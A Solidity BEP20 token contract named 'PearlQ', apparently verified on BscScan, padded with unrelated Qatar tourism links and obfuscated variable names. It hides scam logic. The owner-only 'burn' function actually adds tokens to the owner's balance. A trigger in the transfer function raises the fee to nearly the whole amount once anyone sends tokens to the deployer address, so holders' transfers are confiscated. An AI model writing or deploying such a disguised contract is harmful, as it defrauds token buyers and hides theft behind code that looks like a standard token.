/**
 *Submitted for verification at BscScan.com on 2022-11-19
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-19 13:59 GMT
 */
//Doha: The PearlQatar Food Tour
//https://twitter.com/travelworlddddd/status/1060131236847460353
//https://www.facebook.com/events/1395782897241936/1395783067241919/
//https://anasjaffri.wixsite.com/travelworld/single-post/2017/04/23/15-GREAT-THINGS-TO-DO-IN-QATAR
//https://www.getyourguide.com/doha-l1885/doha-the-pearl-qatar-food-tour-boat-ride-t340906/
//https://www.viator.com/en-SG/tours/Doha/An-immersive-food-tour-and-boat-ride-in-The-Pearl-Qatar/d4453-198185P1?mcid=61846
//

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract CCVBMAZ {
string public  symbol = "PearlQ";
address private  KZCFZT = address(0);
uint256 public constant GQBAQO = 99999;
uint256 private  UVBTGA = 10000000000;
uint256 private  CJQYCO = 100000000;
address private  MRQTMF = address(0);
uint256 private  FHQGKQ = 1000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant totalSupply = 100000000000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
mapping (address => mapping (address => uint256)) private _allowances;
address public owner;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  IUOMWY = 1000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint8 public constant decimals = 18;
address private  FARSNP = address(0);
string public  name = "PearlQ";
address private  QPQIQG = address(0);
uint256 private  RJONRK = 1000000000000000;
uint256 private  EDZHNQ = 10000000000000;
uint256 private  QNFUGT = 1000000000000000000;
address private  ZWRIIB = address(0);
mapping (address => uint256) public balanceOf;
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getCJQYCO() private returns (uint256) {
return CJQYCO;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getQNFUGT() private returns (uint256) {
return QNFUGT;
}

function _getEDZHNQ() private returns (uint256) {
return EDZHNQ;
}

function _getZWRIIB() private returns (address) {
return ZWRIIB;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
constructor () {
MRQTMF = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getQPQIQG() private returns (address) {
return QPQIQG;
}

function _getUVBTGA() private returns (uint256) {
return UVBTGA;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getKZCFZT() private returns (address) {
return KZCFZT;
}

function _getRJONRK() private returns (uint256) {
return RJONRK;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "OWGDED");
require(to != address(0), "OWGDED");
require(amount <= balanceOf[from], "OWGDED");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* GQBAQO/FHQGKQ ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==MRQTMF){
FHQGKQ = GQBAQO+2;
}
emit Transfer(from, to, transferAmount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tOWGDED 0");
require(spender != address(0), "fOWGDED 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getFARSNP() private returns (address) {
return FARSNP;
}

function _getIUOMWY() private returns (uint256) {
return IUOMWY;
}


}